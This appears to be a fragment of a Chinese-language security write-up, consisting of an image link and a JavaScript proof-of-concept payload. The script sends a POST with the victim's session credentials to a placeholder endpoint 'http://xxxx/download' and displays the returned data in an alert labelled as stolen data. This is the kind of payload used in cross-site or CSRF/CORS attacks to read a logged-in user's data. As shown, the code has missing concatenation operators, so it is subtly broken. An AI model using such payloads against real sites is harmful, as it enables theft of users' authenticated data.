![](https://cdn.nlark.com/yuque/0/2025/png/26698826/1751253851115-cc0d184c-d0fb-497d-bfb6-00b0e126341e.png)

```plain
(async () => {
  try {
    const res = await fetch("http://xxxx/download", {
      method: "POST",
      credentials: "include",
      headers: { "Content-Type": "application/json" },
      body: "{}"
    });
    if (!res.ok) {
      alert("请求失败，状态码："   res.status);
      return;
    }
    const data = await res.json();
    alert("窃取的数据:\n"   JSON.stringify(data, null, 2));
  } catch (error) {
    alert("请求异常："   error.message);
  }
})();
```

